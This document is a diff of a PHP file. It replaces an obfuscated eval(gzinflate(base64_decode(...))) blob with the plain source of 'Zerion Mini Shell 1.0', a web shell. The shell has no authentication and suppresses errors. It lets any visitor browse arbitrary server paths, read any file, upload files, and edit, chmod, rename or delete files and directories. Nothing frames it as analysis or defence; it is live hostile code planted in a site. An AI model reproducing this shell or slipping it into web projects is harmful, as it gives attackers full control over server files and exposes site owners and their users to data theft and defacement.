@@ -1,1 +1,303 @@
-<?php eval(gzinflate(base64_decode('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')));?>
+<?php
+
+set_time_limit(0);
+error_reporting(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo '<!DOCTYPE HTML>
+<HTML>
+<HEAD>
+<link href="" rel="stylesheet" type="text/css">
+<title>Mini Shell</title>
+<style>
+body{
+font-family: "Racing Sans One", cursive;
+background-color: #e6e6e6;
+text-shadow:0px 0px 1px #757575;
+}
+#content tr:hover{
+background-color: #636263;
+text-shadow:0px 0px 10px #fff;
+}
+#content .first{
+background-color: silver;
+}
+#content .first:hover{
+background-color: silver;
+text-shadow:0px 0px 1px #757575;
+}
+table{
+border: 1px #000000 dotted;
+}
+H1{
+font-family: "Rye", cursive;
+}
+a{
+color: #000;
+text-decoration: none;
+}
+a:hover{
+color: #fff;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 1px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</HEAD>
+<BODY>
+<H1><center><img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
+ Mini Shell <img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
+ </center></H1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>Direktori : ';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+echo '</td></tr><tr><td>';
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+
+echo '<font color="green">File Ter-Upload :* </font><br />';
+}else{
+echo '<font color="red">Upload gagal, Servernya kek <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
+ </font><br />';
+}
+}
+echo '<form enctype="multipart/form-data" method="POST">
+Upload File : <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr>';
+if(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="green">Change Permission Done.</font><br />';
+}else{
+echo '<font color="red">Change Permission Error.</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Go" />
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="green">Change Name Done.</font><br />';
+}else{
+echo '<font color="red">Change Name Error.</font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Go" />
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="green">Edit File Done ~_^.</font><br />';
+}else{
+echo '<font color="red">Edit File Error ~_~.</font><br />';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Go" />
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br /><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<font color="green">Delete Dir Done.</font><br />';
+}else{
+echo '<font color="red">Delete Dir Error.</font><br />';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<font color="green">Delete File Done.</font><br />';
+}else{
+echo '<font color="red">Delete File Error.</font><br />';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr>';
+
+foreach($scandir as $dir){
+if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+echo "<tr>
+<td><a href=\"?path=$path/$dir\">$dir</a></td>
+<td><center>--</center></td>
+<td><center>";
+if(is_writable("$path/$dir")) echo '<font color="green">';
+elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+echo perms("$path/$dir");
+if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
+
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"\"></option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+<input type=\"hidden\" name=\"name\" value=\"$dir\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+<input type=\"submit\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file("$path/$file")) continue;
+$size = filesize("$path/$file")/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+
+}
+
+echo "<tr>
+<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>";
+if(is_writable("$path/$file")) echo '<font color="green">';
+elseif(!is_readable("$path/$file")) echo '<font color="red">';
+echo perms("$path/$file");
+if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"\"></option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+<option value=\"edit\">Edit</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+<input type=\"submit\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '</table>
+</div>';
+}
+echo '<center><br />Zerion Mini Shell <font color="green">1.0</font></center>
+</BODY>
+</HTML>';
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+?>
